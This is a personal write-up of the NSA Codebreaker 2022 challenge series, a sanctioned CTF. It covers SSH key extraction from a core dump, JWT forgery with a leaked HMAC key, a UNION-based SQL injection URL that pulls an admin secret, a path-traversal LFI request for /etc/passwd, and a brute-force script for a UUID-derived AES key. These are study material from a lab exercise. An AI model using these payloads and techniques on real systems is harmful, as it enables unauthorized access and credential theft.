---
layout: writeup
title: NSA CodeBreakers 2022 
date: 2022-12-17
---

## Addendum:
I'm still revising this write-up.  Expect some poor spelling and grammar errors as I haven't yet finished the complete document to my satisfaction but I wanted to post something to my website since I would have felt lazy otherwise. 


Every year the NSA publishes a series of CTF-like challenges for college students across the country to solve.  This year I managed to solve each of the challenges and wanted to post my strategies for solving the challenges here.  

# Task A1: Anomalous Login
In this challenge we're given a spreadsheet with user login data and provide the user ID for the anomolous behavior.  Essentially in this case the suspicious behavior is a user logging in twice on the same day in relatively short succession (indicating they likely fell for a phishing scam).  I ended up finding the user, by sorting all the users in order of "bytes transferred" in their sessions with the idea that whoever is performing a ransomware attack will require downloading a lot of tools during their session.


# Task A2: PCAP Analysis
In this challenge we're given a pcap along with a tar file containing the files from the attacker's staging server.  We can find a `certificate.pem` file in the tar which we can use the decode the TLS traffic between the staging server and our compromised host.  In the PCAP we uncover a tar file which includes the username of the user who created the archieve, which in my case was "TiredFancyGiant".  I also took the liberty of downloading this tar file which would prove instrumental in the final task.

# Task B1: Inspect Element
This was the easiest challenge by far, basically we're given some web-page with a ransom message, and if we look at the requests the web-page makes, we uncover a suspicious host corresponding to the location of the RaaS (ransomware as a service) platform.  In my case this happened to be: `uxtaghubxevjkqfm.ransommethis.net`.

# Task B2: Git-ing Good
When making requests to this uncovered host, we notice there's a weird "git-hash" header.  Upon some path traversal we find that the host has been published with its .git directory made public (yikers!).  From here we can use existing tools which will re-build a git repo from those exposed git files (unfortunately we can't simply git-clone it).  I used [DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage).

From here, we can analyze the source-code (which happens to be a python flask server) uses `vcyttbrpfwvlosak` as a "pathkey" to access their frontend.

# Task 5: SSH Key Retrieval
This was a doozy.  Basically, we're given the core-dump from the threat actor's instance of `ssh-agent` and need to retrieve their private-key.  Foremost, I looked up the source code for the version of open-ssh that the core-dump originated from and re-built it from source to use with the core-dump that way I had debug symbols to make the reversing process easier.

From there, I opened the ssh-agent binary we were provided into ghidra and found the offsets for important variables like the identity table (in ghidra if you hover over variables it will tell you their offsets relative to the section, e.g., .text+0x550).  From here I basically combed through the id table until I found the sshkey struct--which had the keys hsielded.  From there, I followed the process described in [this blog-post](https://security.humanativaspa.it/openssh-ssh-agent-shielded-private-key-extraction-x86_64-linux/) for unshielding the rsa keys.  I did have to make a slight alteration to the process, namely calling `sshkey_save_private` with the proper enum value for the variant of the key used by the threat actor.

After that I was able to use the key to unencrypt the http cookie file:
```# Netscape HTTP Cookie File
uxtaghubxevjkqfm.ransommethis.net       FALSE   /       TRUE    2145916800      tok     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTQwMDEzMjMsImV4cCI6MTY1NjU5MzMyMywic2VjIjoiUFpJeFV4aE44eWttWmtJcERMbFVYS1YxYjJrUnQxQ28iLCJ1aWQiOjExMzQ1fQ.0nmy2KFR39FzGuV_OXsjDvtttEkp9cp2H759TpR-x7M```

# Task 6: Key Forgery
Decoding the JWT from task 5 we find the following:
```
{
    "iat": 1654001323,
    "exp": 1656593323,
    "sec": "PZIxUxhN8ykmZkIpDLlUXKV1b2kRt1Co",
    "uid": 11345
}
```

We can see that the front-end generates tokens using the same hmac_key of `Cf6illwexoQVjbciZBFhuXRmOrm6oHQt` so we can generate a new unexpired token to authenticate ourselves in the frontend.

In a python IDLE I simply did the following:

```python3
>>> now = datetime.now()
>>> exp = now + timedelta(days=999)
>>> claims = {}
>>> claims['iat']=now
>>> claims['exp']=exp
>>> claims['uid']=11345
>>> claims['sec']="PZIxUxhN8ykmZkIpDLlUXKV1b2kRt1Co"
>>> claims
{'iat': datetime.datetime(2022, 8, 17, 17, 14, 25, 204074), 'exp': datetime.datetime(2022, 11, 25, 17, 14, 25, 204074), 'uid': 11345, 'sec': 'PZIxUxhN8ykmZkIpDLlUXKV1b2kRt1Co'}
>>> new_token = jwt.encode(claims, hmac, algorithm='HS256')
>>> new_token
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjA3NTY0NjUsImV4cCI6MTY2OTM5NjQ2NSwidWlkIjoxMTM0NSwic2VjIjoiUFpJeFV4aE44eWttWmtJcERMbFVYS1YxYjJrUnQxQ28ifQ.0xL1Ha57Y9rtTAHZrn2maM3y2HYdwhzh5tw5cllQpe8'
>>> claims['exp']= now +timedelta(days=30)
>>> claims
{'iat': datetime.datetime(2022, 8, 17, 17, 14, 25, 204074), 'exp': datetime.datetime(2022, 9, 16, 17, 14, 25, 204074), 'uid': 11345, 'sec': 'PZIxUxhN8ykmZkIpDLlUXKV1b2kRt1Co'}
>>> new_token = jwt.encode(claims, hmac, algorithm='HS256')
>>> new_token
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjA3NTY0NjUsImV4cCI6MTY2MzM0ODQ2NSwidWlkIjoxMTM0NSwic2VjIjoiUFpJeFV4aE44eWttWmtJcERMbFVYS1YxYjJrUnQxQ28ifQ.NA9tm7D_kZQMTUHwEzR_2UGn7FYqrwy07BuArVh_ZDo'
```
Sending a GET request to the main page with this forged token logged me in as the non-admin user "FlippantPomegranate"

# Task 7: SQL Injection for Admin Access

Now I needed to get access to an admin account.

Doing some analysis on the python frontend we notice this classic python string-substitution vulnerability:
```infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query```

This infoquery gets directly passed into SQLite3.

My approach from here was to exfil the admin secret character-by-character by UNION SELECTING the query here with:
```https://uxtaghubxevjkqfm.ransommethis.net/vcyttbrpfwvlosak/userinfo?user=' UNION SELECT 1, m.uid, unicode(substr(m.secret, 1, 1)), 1 FROM Accounts m WHERE m.userName='CrazyEnergy'--```

I had to do this trickery with `unicode(substr())` since the frontend expected only integer values to get returned so union selecting with the string secret triggered an error.

Luckily, the secret wasn't too long and I recovered the admin secret:
```''.join(map(chr, [87, 65, 74, 106, 103, 108, 108, 88, 77, 104, 66, 70, 122, 84, 99, 73, 72, 100, 121, 50, 118, 98, 108, 65, 71, 78, 83, 69, 66, 83, 84, 122]))```
Which yielded `WAJjgllXMhBFzTcIHdy2vblAGNSEBSTz` as our secret, with this we can generate an admin token in a identical process to task 6 to get admin access.

# Task 8: GO Rev.
From the admin panel we uncovered an LFI vulnerability from the `fetchlog` backend route which let me exfil the sqlite3 database they were using for both user accounts & storing encryption keys.

Example LFI:
```https://uxtaghubxevjkqfm.ransommethis.net/vcyttbrpfwvlosak/fetchlog?log=../../../etc/passwd``` The NSA people didn't let us exfil /etc/passwd sadly ;-;.  We could get the relevant databases and keyMaster binary though--which happend to be written in go (not fun to reverse!).

The challenge description tells us that the binary uses a key-encrypting-key to store the keys in the database.  Unfortunately, go binaries suck to reverse engineer.  I could load it up in GDB but it was stripped, and ghidra produces somewhat legible output but not a lot.

Luckily, I found some [ghidra scripts online](https://github.com/getCUJO/ThreatIntel/tree/master/Scripts/Ghidra) which did a decent-enough job at recovering function names which made it a little easier to infer what certain functions did in the go binary.

My process involved setting breakpoints from the ghidra decomp. and then looking around in memory with GDB for what might end up being the encryption keys.  I would run the keyMaster binary with some mock input to generate a plaintext key, try and locate where it got generated and eventually found the 64-bit encryption key which they were using for their standard keys--which turned out to be UUIDs!

The key encrypting key in my case ended up being `"ff2a830cf4d1d9c04ee41edad34220c98666a75eb9eef035d7709c1ae9b9519309d63ed860f09c92c61805148f9b9350fc4c09722c4490ea2e198567c789cbcf"`.

From here I could decrypt any of the encryption keys with a [nice little cyber-chef recipe](
https://icyberchef.com/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'/yqDDPTR2cBO5B7a00IgyYZmp1657vA113CcGum5UZM%3D'%7D,%7B'option':'Hex','string':'79bc459a0be54f31ab28a790c1984c47'%7D,'CBC/NoPadding','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=U0JLdUFjQUJXSnZ1b3pjaTBGRGJSb0FzU091WnpZcC9KeVVHKy9GTnVEMytBNzFKbVg4Y0lkOS9wK3hkSHZXY0VUYWtkcFBLQW1QeWE5U0FzT1gzMEE9PQ)

# Task 9: BRUTE FORCE

We're given an encrypted pdf that we need to decrypt.  From task A2 we are able to extract the tar file with the hacker's tools.
Inside we see the script they used to encrpyt the file with openssl & busybox and notice that they use aes-128-cbc encryption
with only the first 32 bytes of the uuid used as a key.

The IV for the encryption is also appended to the encrypted file as the first 32 bytes--easily extracted via a python script.

I basically just brute-forced the 32-byte key by figuring out a general range in seconds where the key would be generated.
That being said, it took forever to write a script for which I had any degree of confidence in it working successfully.

My strategy eventually worked.  The key itself was just the first 32 bytes of the UUID which only included the timestamp
portion.  The IV for the AES encrpytion

Computing the time delta between the time a log got added to the log.txt file and the timestamp in nanoseconds for the
uuid key got me a lower and upperbound of timestamps in the nanosecond that I could brute-force.  It took around 10-17
hours for my script to enumerate through all the UUIDs but eventually I got it.


```
Congratulations on completing the 2022 Codebreaker Challenge!
The answer to Task 9 is:
VOessEMKm9plu1IhxW5LiiL3c6TBhEJT
```

I should note my solution was *really* inefficient.  I basically wrote a medicore python script and let it run for about 36 hours before it found the right key.  The reason why my script was really slow was because for each key I completely decrypted the encrypted file when you can just use the first block to test if the key works (by checking if the file signature matches a PDF file).  This is because the ransomware worked as a block-cipher, but my knowledge of cryptography was pretty mediocre so I relied on the following python script:
```python3
from datetime import datetime, timedelta, timezone
import dateutil.tz
import time
from uuid import UUID
from subprocess import DEVNULL, run, STDOUT

from time import mktime, struct_time
import dateutil.parser

def sec_to_100_ns(sec: int):
  return int(sec * 10000000)
def ns_100_to_sec(sec: int):
  return sec // 10000000

def zero_pad(n: str, l: int):
  return '0'*(l-len(n)) + n

def newUUID(unix_time: int, seq: int, nodeid: int):
  time_low = unix_time & 0xffffffff
  time_mid = (unix_time >> 32) & 0xffff
  time_hi_version  = (unix_time >> 48) & 0x0fff
  clock_seq_low = seq & 0xff
  clock_seq_hi_variant = (seq >> 8) & 0x3f

  return UUID(fields=(
    time_low, time_mid, time_hi_version,
    clock_seq_hi_variant, clock_seq_low,
    nodeid), version=1)


# Do statistical analysis on prior entries.
# We want to figure out the time delta between
# a log being made in the .log file and the token
# creation by the keyMaster binary.
TokenTimestamps = [
  0x1eb520cc239094f,
  0x1eb554d08ff5868,
  0x1eb74e13209b8dc,
  0x1eb791a655ce14a,
  0x1eb963a73ab7e73,
  0x1eb977c2660ac80,
  0x1eb977d9000aa40,
  0x1eb9ea511b40ec0,
  0x1eba2ad3672decc,
  0x1eba5578db18de3,
  0x1eba71b1848b985,
  0x1ebc208957078ee,
  0x1ebc4ea7d5a5f66,
  0x1ebcd67a941e2ae,
  0x1ebd328183ecd21,
  0x1ebde8c3f160f78,
  0x1ebe4ee73cdcfc5,
  0x1ebf1bc190cbb4c,
  0x1ebf936a97e6cbd,
  0x1ebfe52d2f2efb5,
  0x1ec028862d1fc75,
  0x1ec03bf90ea9a8f,
  0x1ec04a9eb7bccc5,
  0x1ec09ff2f40ea99,
  0x1ec0c51aa9d6fde,
  0x1ec0edce936259e,
  0x1ec18dfef8f9140,
  0x1ec1ccfaf01b8a6,
  0x1ec1fc092aae597,
  0x1ec22691dce18bd,
  0x1ec308d766c908f,
  0x1ec38f677a80fd7,
  0x1ec3d2fe2d72bb8,
  0x1ec3e4b4ef2626b,
  0x1ec40f0525953ca,
  0x1ec413979c0baa1,
  0x1ec4210655af328,
  0x1ec448f34404138,
  0x1ec4553e749887d,
  0x1ec45b65f6f9cdc,
  0x1ec4c931742abf0,
  0x1ec4eb737ad753d,
  0x1ec508d366b73c2,
  0x1ec57d18d2d612b,
  0x1ec5a19f4181acc,
  0x1ec5e3fbff9e687,
  0x1ec5f8ce154b973,
  0x1ec60ac30843138,
  0x1ec619e26e6b107,
  0x1ec61abed66c2c0
]

dts = [
'2021-01-08T18:53:58-05:00',
'2021-01-12T22:11:43-05:00',
'2021-02-22T02:40:20-05:00',
'2021-02-27T11:39:56-05:00',
'2021-04-05T14:12:23-04:00',
'2021-04-07T04:35:12-04:00',
'2021-04-07T04:45:20-04:00',
'2021-04-16T07:15:43-04:00',
'2021-04-21T10:24:08-04:00',
'2021-04-24T19:48:31-04:00',
'2021-04-27T01:40:45-04:00',
'2021-05-31T08:06:17-04:00',
'2021-06-04T00:08:24-04:00',
'2021-06-14T19:24:37-04:00',
'2021-06-22T03:04:42-04:00',
'2021-07-06T14:59:22-04:00',
'2021-07-14T17:57:25-04:00',
'2021-07-31T00:59:46-04:00',
'2021-08-09T13:24:40-04:00',
'2021-08-16T01:28:51-04:00',
'2021-08-21T10:02:20-04:00',
'2021-08-22T23:09:51-04:00',
'2021-08-24T03:07:28-04:00',
'2021-08-30T22:00:23-04:00',
'2021-09-02T20:55:53-04:00',
'2021-09-06T02:37:42-04:00',
'2021-09-18T20:24:28-04:00',
'2021-09-23T20:38:16-04:00',
'2021-09-27T14:27:41-04:00',
'2021-09-30T23:39:08-04:00',
'2021-10-18T23:34:35-04:00',
'2021-10-29T16:26:27-04:00',
'2021-11-04T01:27:34-04:00',
'2021-11-05T11:16:22-04:00',
'2021-11-08T19:02:37-05:00',
'2021-11-09T03:46:13-05:00',
'2021-11-10T05:24:40-05:00',
'2021-11-13T09:37:29-05:00',
'2021-11-14T09:05:32-05:00',
'2021-11-14T20:50:21-05:00',
'2021-11-23T14:25:25-05:00',
'2021-11-26T07:49:06-05:00',
'2021-11-28T15:53:25-05:00',
'2021-12-07T21:50:15-05:00',
'2021-12-10T19:33:34-05:00',
'2021-12-16T02:14:11-05:00',
'2021-12-17T17:58:50-05:00',
'2021-12-19T04:15:28-05:00',
'2021-12-20T09:07:29-05:00',# 2021-12-20T09:07:23-05:00 -6 seconds
'2021-12-20T10:46:08-05:00' # 2021-12-20T10:46:00-05:00 -8 seconds
]


deltas = []
for index, token in enumerate(TokenTimestamps):
  # For some reason our log times are 3 hours ahead of the UUID time stamps so the -10800 handles that
  log_time_100_ns = sec_to_100_ns( mktime(dateutil.parser.isoparse(dts[index]).utctimetuple()) - (8 * 60 * 60))
  # print (dts[index], mktime(dateutil.parser.isoparse(dts[index]).utctimetuple()) )

  log_time_normalized = log_time_100_ns + 0x01b21dd213814000
  token_timestamp = datetime.fromtimestamp(ns_100_to_sec(token - 0x01b21dd213814000))
  difference = log_time_normalized - token #- (3 * 60 * 60 * 1e7)#- int(1.08e+11)
  #print("Difference between", (dateutil.parser.isoparse(dts[index]) - timedelta(hours=3)).isoformat(), ' and ', token_timestamp.isoformat(), "=", (difference/1e7), 'seconds')
  #input()
  deltas.append(difference)
print(sorted(deltas))
print(len(deltas), len(set(deltas)))


stamp = int(mktime(dateutil.parser.isoparse('2022-02-10T07:38:17-05:00').utctimetuple())  - (8 * 60 * 60))

max_iterations = max(deltas)-MIN_OFFSET
timestamp = (sec_to_100_ns(stamp) + 0x01b21dd213814000) - MIN_OFFSET
reverted_timestamp = ns_100_to_sec(timestamp - 0x01b21dd213814000)

iteration = 0
delta = -1 # 1 ms in 100 nanoseconds
# Starts at 38:16
# If we get to 37:50 there's something wrong with this approach

max_revert = ns_100_to_sec((timestamp+(max_iterations*delta)) - 0x01b21dd213814000)

date = datetime.fromtimestamp(stamp) #, tz=timezone.utc) #, tz=timezone.utc)
print("Timestamp date @", date.isoformat())
print(f"Starting at timestamp-{MIN_OFFSET} (or {datetime.fromtimestamp(reverted_timestamp).isoformat()}), max timestamp will be {timestamp+(max_iterations*delta)} or {datetime.fromtimestamp(max_revert)}")
input('Press to begin decryption work')

start = (sec_to_100_ns(stamp) + 0x01b21dd213814000)

while True:
  id = newUUID(timestamp, 0, 0xc6dc4eceffff)
  key = hex(int.from_bytes(bytes(str(id)[:16], encoding="ascii"), byteorder='big'))[2:]
  assert len(key) == 32
  res = run(['./openssl', 'enc', '-d', '-aes-128-cbc','-K', key, '-iv', '596ff0d6b0361ac63f6eb8b8d0d6943b', '-in', 'target.bin', '-out', 'yeet.pdf'], stdout=DEVNULL, stderr=DEVNULL)
  debug = ((timestamp - 0x01b21dd213814000 )*100)//1000000000
  date = datetime.fromtimestamp(debug)
  offset = start - timestamp
  print(f"Trying stamp: {timestamp}\t\tkey: {key}\t\tTIME: ${date.isoformat()}\t\tUUID: {str(id)[:16]}\t\t offset: {offset}", end='\r')
  if (res.returncode == 0):
    _sanity = run(['file', './yeet.pdf'], capture_output=True)
    if (_sanity.stdout != b'./yeet.pdf: data\n'):
      if (b'PDF' in _sanity.stdout):
        print(f"\n\nDecrypted file with timestamp = {timestamp}")
        break
      print('\n', _sanity.stdout, timestamp,'\n')
      #input("Continue?")

  timestamp +=  delta
  iteration += 1
  if (iteration >= max_iterations):
    print("Reached all iterations, no match found :C")
    break

```

After all that, I finally got the solution to task 9 in the form of a pdf with the following text:
```
Congratulations on completing the 2022 Codebreaker Challenge!
The answer to Task 9 is:
VOessEMKm9plu1IhxW5LiiL3c6TBhEJT
```











